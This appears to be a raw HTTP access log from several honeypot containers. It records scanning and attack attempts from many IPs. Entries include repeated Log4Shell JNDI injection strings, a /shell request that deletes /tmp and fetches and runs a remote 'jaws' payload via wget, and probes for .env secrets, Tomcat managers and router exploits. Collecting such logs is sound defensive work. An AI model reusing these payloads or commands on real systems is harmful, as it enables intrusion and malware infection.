swipe-t-2_running | 20.4.210.27 | 12/Nov/2022:17:26:19 | GET /.svn/ HTTP/1.1 | - | Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36 | y
swipe-t-2_running | 118.41.204.72 | 15/Nov/2022:07:45:39 | GET / HTTP/1.1 | ${jndi:ldap://:8188/a} | ${jndi:ldap://:8188/a} | y
swipe-t-2_running | 118.218.209.149 | 15/Nov/2022:07:49:15 | GET / HTTP/1.1 | ${jndi:ldap://:8180/a} | ${jndi:ldap://:8180/a} | y
swipe-t-2_running | 191.242.188.103 | 15/Nov/2022:07:52:00 | GET / HTTP/1.1 | ${jndi:ldap://:8185/a} | ${jndi:ldap://:8185/a} | y
swipe-t-2_running | 40.87.11.253 | 15/Nov/2022:07:52:23 | GET / HTTP/1.1 | ${jndi:ldap://:8186/a} | ${jndi:ldap://:8186/a} | y
swipe-t-2_running | 144.22.130.100 | 15/Nov/2022:07:54:24 | GET / HTTP/1.1 | ${jndi:ldap://:8187/a} | ${jndi:ldap://:8187/a} | y
swipe-t-2_running | 147.182.233.56 | 15/Nov/2022:07:57:01 | GET / HTTP/1.1 | ${jndi:ldap://:8182/a} | ${jndi:ldap://:8182/a} | y
swipe-t-2_running | 194.146.24.107 | 15/Nov/2022:08:00:07 | GET /config/getuser?index=0 HTTP/1.1 | - | Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0 | y
swipe-t-2_running | 144.22.191.115 | 15/Nov/2022:08:02:57 | GET / HTTP/1.1 | ${jndi:ldap://:8189/a} | ${jndi:ldap://:8189/a} | y
swipe-t-2_running | 76.120.101.208 | 15/Nov/2022:08:15:13 | GET / HTTP/1.1 | - | - | y
swipe-t-2_running | 222.117.95.174 | 15/Nov/2022:08:17:30 | GET / HTTP/1.1 | ${jndi:ldap://:8188/a} | ${jndi:ldap://:8188/a} | y
swipe-t_running | 128.14.134.134 | 15/Nov/2022:07:39:53 | GET / HTTP/1.1 | - | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 | y
swipe-t_running | 194.146.24.107 | 15/Nov/2022:07:50:18 | GET /config/getuser?index=0 HTTP/1.1 | - | Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0 | y
swipe-t_running | 185.180.143.8 | 15/Nov/2022:07:55:04 | GET / HTTP/1.1 | - | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 | y
swipe-t_running | 185.180.143.8 | 15/Nov/2022:07:55:04 | GET / HTTP/1.1 | - | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 | y
swipe-t_running | 76.120.101.208 | 15/Nov/2022:08:15:18 | GET / HTTP/1.1 | - | - | y
blank-t_running | 128.14.133.58 | 15/Nov/2022:08:29:21 | GET / HTTP/1.1 | - | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 | y
pwd-t_running | 76.120.101.208 | 15/Nov/2022:08:15:01 | GET / HTTP/1.1 | - | - | y
pwd-t_running | 167.94.146.57 | 15/Nov/2022:08:17:25 | GET / HTTP/1.1 | - | - | y
pwd-t_running | 167.94.146.57 | 15/Nov/2022:08:17:25 | GET / HTTP/1.1 | - | Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/) | y
pwd-t_running | 167.94.146.57 | 15/Nov/2022:08:17:25 | PRI command-cache.json cron_jobs force_cleanup.sh honeypot_environment nat_rules.sh process_complete_container.sh README.md serve_honeypot.sh start_all_honeypots.sh start_up HTTP/2.0 | - | - | n
pwd-t_running | 167.94.146.57 | 15/Nov/2022:08:17:30 | GET /favicon.ico HTTP/1.1 | - | Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/) | y
pwd-t_running | 194.146.24.107 | 15/Nov/2022:08:21:05 | GET /config/getuser?index=0 HTTP/1.1 | - | Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0 | y
pwd-t_running | 101.35.198.225 | 15/Nov/2022:08:30:46 | GET / HTTP/1.1 | ${jndi:ldap://:8187/a} | ${jndi:ldap://:8187/a} | y
pwd-t_running | 101.35.198.225 | 15/Nov/2022:08:31:01 | GET / HTTP/1.1 | ${jndi:ldap://:8187/a} | ${jndi:ldap://:8187/a} | y
blank-t-2_running | 128.1.248.26 | 15/Nov/2022:07:35:35 | GET / HTTP/1.1 | - | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 | y
blank-t-2_running | 159.89.36.197 | 15/Nov/2022:07:38:57 | \x16\x03\x01 | - | - | n
blank-t-2_running | 159.89.36.197 | 15/Nov/2022:07:38:57 | \x16\x03\x01 | - | - | n
blank-t-2_running | 159.89.36.197 | 15/Nov/2022:07:38:57 | GET / HTTP/1.1 | - | Mozilla/5.0 zgrab/0.x | y
blank-t-2_running | 79.122.229.65 | 15/Nov/2022:08:10:34 | GET / HTTP/1.1 | - | Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7 | y
blank-t-2_running | 65.154.226.220 | 15/Nov/2022:08:13:32 | GET /explore HTTP/1.1 | - | Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36 | y
blank-t-2_running | 76.120.101.208 | 15/Nov/2022:08:15:18 | GET / HTTP/1.1 | - | - | y
it-t-2_running | 87.236.176.148 | 15/Nov/2022:07:44:57 | GET / HTTP/1.1 | - | Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/) | y
it-t-2_running | 87.236.176.48 | 15/Nov/2022:07:45:05 | GET /sites/default/files/favicon.ico HTTP/1.1 | - | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 | y
it-t-2_running | 197.255.253.7 | 15/Nov/2022:07:45:58 | GET / HTTP/1.1 | - | Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 | y
it-t-2_running | 194.146.24.107 | 15/Nov/2022:08:01:44 | GET /config/getuser?index=0 HTTP/1.1 | - | Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0 | y
it-t-2_running | 194.32.122.72 | 15/Nov/2022:08:04:07 | GET /wp-json/wp/v2/users HTTP/1.1 | - | python-requests/2.27.1 | y
it-t-2_running | 194.32.122.72 | 15/Nov/2022:08:04:07 | GET /wp-admin/install.php HTTP/1.1 | - | python-requests/2.27.1 | y
it-t-2_running | 193.118.53.194 | 15/Nov/2022:08:13:25 | GET / HTTP/1.1 | - | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 | y
it-t-2_running | 76.120.101.208 | 15/Nov/2022:08:15:03 | GET / HTTP/1.1 | - | - | y
it-t-2_running | 128.199.102.70 | 15/Nov/2022:08:33:58 | \x16\x03\x01 | - | - | n
it-t-2_running | 128.199.102.70 | 15/Nov/2022:08:33:59 | \x16\x03\x01 | - | - | n
it-t-2_running | 128.199.102.70 | 15/Nov/2022:08:33:59 | GET / HTTP/1.1 | - | Mozilla/5.0 zgrab/0.x | y
it-t-2_running | 152.89.196.211 | 15/Nov/2022:08:37:05 | GET /actuator/gateway/routes HTTP/1.1 | - | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 | y
blank-t_running | 66.54.98.234 | 15/Nov/2022:08:45:45 | GET /boaform/admin/formLogin?username=user&psd=user HTTP/1.0 | - | - | y
it-t_running | 76.120.101.208 | 15/Nov/2022:08:14:58 | GET / HTTP/1.1 | - | - | y
it-t_running | 194.146.24.107 | 15/Nov/2022:08:35:29 | GET /config/getuser?index=0 HTTP/1.1 | - | Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0 | y
it-t_running | 183.136.225.32 | 15/Nov/2022:08:40:02 | GET / HTTP/1.1 | - | Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0 | y
it-t_running | 64.62.197.17 | 15/Nov/2022:08:41:32 | GET / HTTP/1.1 | - | Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Safari/605.1.15 | y
it-t_running | 146.190.90.13 | 15/Nov/2022:08:41:36 | \x16\x03\x01 | - | - | n
it-t_running | 146.190.90.13 | 15/Nov/2022:08:41:36 | \x16\x03\x01 | - | - | n
it-t_running | 146.190.90.13 | 15/Nov/2022:08:41:37 | GET / HTTP/1.1 | - | Mozilla/5.0 zgrab/0.x | y
it-t_running | 64.62.197.26 | 15/Nov/2022:08:43:59 | GET /favicon.ico HTTP/1.1 | - | Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0 | y
it-t_running | 152.89.196.211 | 15/Nov/2022:08:52:02 | GET /actuator/gateway/routes HTTP/1.1 | - | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 | y
it-t_running | 183.136.225.32 | 15/Nov/2022:08:53:54 | GET /sites/default/files/favicon.ico HTTP/1.1 | - | Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE | y
it-t_running | 183.136.225.32 | 15/Nov/2022:08:53:54 | GET /robots.txt HTTP/1.1 | - | Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE | y
it-t_running | 183.136.225.32 | 15/Nov/2022:08:54:09 | GET /sites/default/modules/jquery_update/replace/jquery/1.10/jquery.min468f.js?v=1.10.2 HTTP/1.1 | - | Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE | y
it-t_running | 183.136.225.32 | 15/Nov/2022:08:54:12 | GET /misc/jquery-extend-3.4.0468f.js?v=1.10.2 HTTP/1.1 | - | Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE | y
it-t_running | 183.136.225.32 | 15/Nov/2022:08:54:13 | GET /misc/jquery-html-prefilter-3.5.0-backport468f.js?v=1.10.2 HTTP/1.1 | - | Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE | y
it-t_running | 183.136.225.32 | 15/Nov/2022:08:54:14 | GET /misc/jquery.once7839.js?v=1.2 HTTP/1.1 | - | Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE | y
it-t_running | 183.136.225.32 | 15/Nov/2022:08:54:17 | GET /misc/drupal726b.js?rg27la HTTP/1.1 | - | Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE | y
it-t_running | 183.136.225.32 | 15/Nov/2022:08:54:17 | GET /cdn.jsdelivr.net/bootstrap/3.3.5/js/bootstrap.js HTTP/1.1 | - | Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE | y
it-t_running | 183.136.225.32 | 15/Nov/2022:08:54:18 | GET /sites/default/modules/user_alert/js/user-alert726b.js?rg27la HTTP/1.1 | - | Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE | y
it-t_running | 183.136.225.32 | 15/Nov/2022:08:54:18 | GET /sites/default/modules/views_slideshow_xtra/views_slideshow_xtra_overlay/js/views_slideshow_xtra_overlay726b.js?rg27la HTTP/1.1 | - | Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE | y
it-t_running | 183.136.225.32 | 15/Nov/2022:08:54:19 | GET /sites/default/modules/lightbox2/js/lightbox726b.js?rg27la HTTP/1.1 | - | Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE | y
it-t_running | 183.136.225.32 | 15/Nov/2022:08:54:19 | GET /sites/default/modules/google_analytics/googleanalytics726b.js?rg27la HTTP/1.1 | - | Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE | y
it-t_running | 183.136.225.32 | 15/Nov/2022:08:54:29 | GET /sites/default/themes/bookstrap_subtheme/js/hovereffect726b.js?rg27la HTTP/1.1 | - | Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE | y
it-t_running | 183.136.225.32 | 15/Nov/2022:08:54:30 | GET /sites/default/themes/bootstrap/js/bootstrap726b.js?rg27la HTTP/1.1 | - | Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE | y
swipe-t-2_running | 85.51.217.156 | 15/Nov/2022:08:22:39 | GET / HTTP/1.1 | ${jndi:ldap://:8189/a} | ${jndi:ldap://:8189/a} | y
swipe-t-2_running | 36.112.152.152 | 15/Nov/2022:08:28:47 | GET / HTTP/1.1 | ${jndi:ldap://:8184/a} | ${jndi:ldap://:8184/a} | y
swipe-t-2_running | 222.117.95.174 | 15/Nov/2022:08:28:50 | GET / HTTP/1.1 | ${jndi:ldap://:8188/a} | ${jndi:ldap://:8188/a} | y
swipe-t-2_running | 144.22.130.100 | 15/Nov/2022:08:30:09 | GET / HTTP/1.1 | ${jndi:ldap://:8187/a} | ${jndi:ldap://:8187/a} | y
swipe-t-2_running | 118.41.204.72 | 15/Nov/2022:08:32:36 | GET / HTTP/1.1 | ${jndi:ldap://:8188/a} | ${jndi:ldap://:8188/a} | y
swipe-t-2_running | 124.221.186.26 | 15/Nov/2022:08:35:08 | GET / HTTP/1.1 | - | Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36 | y
swipe-t-2_running | 40.87.11.253 | 15/Nov/2022:08:35:29 | GET / HTTP/1.1 | ${jndi:ldap://:8186/a} | ${jndi:ldap://:8186/a} | y
swipe-t-2_running | 85.51.217.156 | 15/Nov/2022:08:37:07 | GET / HTTP/1.1 | ${jndi:ldap://:8189/a} | ${jndi:ldap://:8189/a} | y
swipe-t-2_running | 191.242.188.103 | 15/Nov/2022:08:40:23 | GET / HTTP/1.1 | ${jndi:ldap://:8185/a} | ${jndi:ldap://:8185/a} | y
swipe-t-2_running | 37.44.238.205 | 15/Nov/2022:08:51:35 | GET / HTTP/1.1 | - | Linux Gnu (cow) | y
swipe-t-2_running | 185.55.64.228 | 15/Nov/2022:08:52:48 | GET / HTTP/1.1 | ${jndi:ldap://:8180/a} | ${jndi:ldap://:8180/a} | y
swipe-t-2_running | 120.236.79.182 | 15/Nov/2022:08:58:05 | GET / HTTP/1.1 | ${jndi:ldap://:8189/a} | ${jndi:ldap://:8189/a} | y
swipe-t-2_running | 85.51.24.68 | 15/Nov/2022:09:03:28 | GET / HTTP/1.1 | ${jndi:ldap://:8188/a} | ${jndi:ldap://:8188/a} | y
swipe-t-2_running | 40.87.11.253 | 15/Nov/2022:09:04:15 | GET / HTTP/1.1 | ${jndi:ldap://:8186/a} | ${jndi:ldap://:8186/a} | y
swipe-t-2_running | 89.100.220.200 | 15/Nov/2022:09:19:40 | GET / HTTP/1.1 | ${jndi:ldap://:8180/a} | ${jndi:ldap://:8180/a} | y
swipe-t_running | 64.62.197.117 | 15/Nov/2022:08:41:21 | GET / HTTP/1.1 | - | Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 | y
swipe-t_running | 93.177.103.215 | 15/Nov/2022:08:41:52 | GET /.env HTTP/1.1 | - | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36 | y
swipe-t_running | 93.177.103.215 | 15/Nov/2022:08:41:52 | \x16\x03\x01\x01H\x01 | - | - | n
swipe-t_running | 64.62.197.107 | 15/Nov/2022:08:43:25 | GET /favicon.ico HTTP/1.1 | - | Mozilla/5.0 (Windows NT 10.0; rv:104.0) Gecko/20100101 Firefox/104.0 | y
swipe-t_running | 152.89.196.211 | 15/Nov/2022:09:06:30 | GET /actuator/gateway/routes HTTP/1.1 | - | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 | y
swipe-t_running | 194.180.48.125 | 15/Nov/2022:09:28:23 | GET /explore HTTP/1.1 | - | AdsBot-Google ( http://www.google.com/adsbot.html) | y
blank-t-2_running | 152.89.196.211 | 15/Nov/2022:09:06:14 | GET /actuator/gateway/routes HTTP/1.1 | - | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 | y
blank-t-2_running | 194.146.24.107 | 15/Nov/2022:09:29:21 | GET /config/getuser?index=0 HTTP/1.1 | - | Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0 | y
blank-t-2_running | 198.235.24.43 | 15/Nov/2022:09:29:52 | \x16\x03\x01 | - | - | n
pwd-t_running | 85.51.24.68 | 15/Nov/2022:09:08:13 | GET / HTTP/1.1 | ${jndi:ldap://:8188/a} | ${jndi:ldap://:8188/a} | y
pwd-t_running | 85.51.24.68 | 15/Nov/2022:09:12:06 | GET / HTTP/1.1 | ${jndi:ldap://:8188/a} | ${jndi:ldap://:8188/a} | y
pwd-t_running | 101.35.198.225 | 15/Nov/2022:09:13:00 | GET / HTTP/1.1 | ${jndi:ldap://:8182/a} | ${jndi:ldap://:8182/a} | y
pwd-t_running | 64.62.197.218 | 15/Nov/2022:09:27:55 | GET / HTTP/1.1 | - | Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0 | y
pwd-t_running | 64.62.197.214 | 15/Nov/2022:09:30:39 | GET /favicon.ico HTTP/1.1 | - | Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:105.0) Gecko/20100101 Firefox/105.0 | y
it-t-2_running | 93.177.103.215 | 15/Nov/2022:09:04:41 | GET /.env HTTP/1.1 | - | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36 | y
it-t-2_running | 93.177.103.215 | 15/Nov/2022:09:04:41 | \x16\x03\x01\x01H\x01 | - | - | n
it-t_running | 194.146.24.107 | 15/Nov/2022:10:01:12 | GET /config/getuser?index=0 HTTP/1.1 | - | Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0 | y
it-t_running | 192.241.204.237 | 15/Nov/2022:10:08:30 | GET /manager/text/list HTTP/1.1 | - | Mozilla/5.0 zgrab/0.x | y
blank-t_running | 120.236.79.182 | 15/Nov/2022:10:21:45 | GET / HTTP/1.1 | ${jndi:ldap://:8189/a} | ${jndi:ldap://:8189/a} | y
swipe-t-2_running | 36.112.152.152 | 15/Nov/2022:09:24:29 | GET / HTTP/1.1 | ${jndi:ldap://:8184/a} | ${jndi:ldap://:8184/a} | y
swipe-t-2_running | 118.218.209.149 | 15/Nov/2022:09:31:22 | GET / HTTP/1.1 | ${jndi:ldap://:8180/a} | ${jndi:ldap://:8180/a} | y
swipe-t-2_running | 185.180.143.138 | 15/Nov/2022:09:44:30 | GET / HTTP/1.1 | - | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 | y
swipe-t-2_running | 185.180.143.138 | 15/Nov/2022:09:44:31 | GET / HTTP/1.1 | - | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 | y
swipe-t-2_running | 195.87.73.208 | 15/Nov/2022:10:00:25 | GET / HTTP/1.1 | ${jndi:ldap://:8182/a} | ${jndi:ldap://:8182/a} | y
swipe-t-2_running | 191.242.188.103 | 15/Nov/2022:10:04:56 | GET / HTTP/1.1 | ${jndi:ldap://:8184/a} | ${jndi:ldap://:8184/a} | y
swipe-t-2_running | 194.146.24.107 | 15/Nov/2022:10:08:02 | GET /config/getuser?index=0 HTTP/1.1 | - | Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0 | y
swipe-t-2_running | 192.241.204.237 | 15/Nov/2022:10:08:32 | GET /manager/text/list HTTP/1.1 | - | Mozilla/5.0 zgrab/0.x | y
swipe-t-2_running | 146.56.115.253 | 15/Nov/2022:10:15:30 | GET / HTTP/1.1 | ${jndi:ldap://146.56.115.253:8183/a} | ${jndi:ldap://146.56.115.253:8183/a} | y
swipe-t_running | 146.190.29.239 | 15/Nov/2022:09:44:38 | \x16\x03\x01 | - | - | n
swipe-t_running | 146.190.29.239 | 15/Nov/2022:09:44:38 | \x16\x03\x01 | - | - | n
swipe-t_running | 146.190.29.239 | 15/Nov/2022:09:44:38 | GET / HTTP/1.1 | - | Mozilla/5.0 zgrab/0.x | y
swipe-t_running | 192.241.204.237 | 15/Nov/2022:10:08:31 | GET /manager/text/list HTTP/1.1 | - | Mozilla/5.0 zgrab/0.x | y
swipe-t_running | 141.255.166.2 | 15/Nov/2022:10:23:31 | GET / HTTP/1.1 | - | Hello World | y
blank-t-2_running | 41.216.183.150 | 15/Nov/2022:09:47:50 | GET / HTTP/1.1 | - | - | y
blank-t-2_running | 41.216.183.150 | 15/Nov/2022:09:48:05 | POST /GponForm/diag_Form?images/ HTTP/1.1 | - | Momentum | n
blank-t-2_running | 192.241.204.237 | 15/Nov/2022:10:08:34 | GET /manager/text/list HTTP/1.1 | - | Mozilla/5.0 zgrab/0.x | y
blank-t-2_running | 141.255.166.2 | 15/Nov/2022:10:20:17 | GET / HTTP/1.1 | - | Hello World | y
blank-t-2_running | 109.237.97.180 | 15/Nov/2022:10:34:07 | GET /.env HTTP/1.1 | - | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36 | y
blank-t-2_running | 109.237.97.180 | 15/Nov/2022:10:34:07 | \x16\x03\x01\x01H\x01 | - | - | n
pwd-t_running | 194.146.24.107 | 15/Nov/2022:10:06:52 | GET /config/getuser?index=0 HTTP/1.1 | - | Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0 | y
pwd-t_running | 192.241.204.237 | 15/Nov/2022:10:08:27 | GET /manager/text/list HTTP/1.1 | - | Mozilla/5.0 zgrab/0.x | y
pwd-t_running | 117.215.255.52 | 15/Nov/2022:10:14:18 | GET / HTTP/1.1 | - | Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7 | y
pwd-t_running | 194.146.24.107 | 15/Nov/2022:10:15:02 | GET /config/getuser?index=0 HTTP/1.1 | - | Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0 | y
pwd-t_running | 117.243.200.117 | 15/Nov/2022:10:18:34 | GET / HTTP/1.1 | - | Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7 | y
pwd-t_running | 141.255.166.2 | 15/Nov/2022:10:23:34 | GET / HTTP/1.1 | - | Hello World | y
pwd-t_running | 35.216.166.72 | 15/Nov/2022:10:38:58 | GET / HTTP/1.1 | - | Mozilla/5.0 | y
pwd-t_running | 192.241.201.45 | 15/Nov/2022:10:40:28 | GET /manager/html HTTP/1.1 | - | Mozilla/5.0 zgrab/0.x | y
it-t-2_running | 185.180.143.6 | 15/Nov/2022:09:45:49 | GET / HTTP/1.1 | - | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 | y
it-t-2_running | 190.3.83.100 | 15/Nov/2022:09:55:23 | GET / HTTP/1.1 | - | Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 | y
it-t-2_running | 194.146.24.107 | 15/Nov/2022:09:55:52 | GET /config/getuser?index=0 HTTP/1.1 | - | Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0 | y
it-t-2_running | 218.145.61.20 | 15/Nov/2022:09:59:23 | GET /shell?cd+/tmp;rm+-rf+*;wget+207.199.156.32/jaws;sh+/tmp/jaws HTTP/1.1 | - | Hello, world | y
it-t-2_running | 192.241.204.237 | 15/Nov/2022:10:08:21 | GET /manager/text/list HTTP/1.1 | - | Mozilla/5.0 zgrab/0.x | y
it-t-2_running | 194.180.48.125 | 15/Nov/2022:10:23:32 | GET /explore HTTP/1.1 | - | Mozilla/3.01Gold (Win95; I) | y
it-t-2_running | 205.169.39.63 | 15/Nov/2022:10:23:45 | GET /explore HTTP/1.1 | - | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/104.0.5112.101 Safari/537.36 | y
it-t-2_running | 192.241.201.45 | 15/Nov/2022:10:40:24 | GET /manager/html HTTP/1.1 | - | Mozilla/5.0 zgrab/0.x | y
it-t-2_running | 141.255.166.2 | 15/Nov/2022:10:40:54 | GET / HTTP/1.1 | - | Hello World | y
blank-t_running | 191.242.188.103 | 15/Nov/2022:10:49:29 | GET / HTTP/1.1 | ${jndi:ldap://:8182/a} | ${jndi:ldap://:8182/a} | y
blank-t_running | 93.177.103.215 | 15/Nov/2022:11:12:00 | GET /.env HTTP/1.1 | - | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36 | y
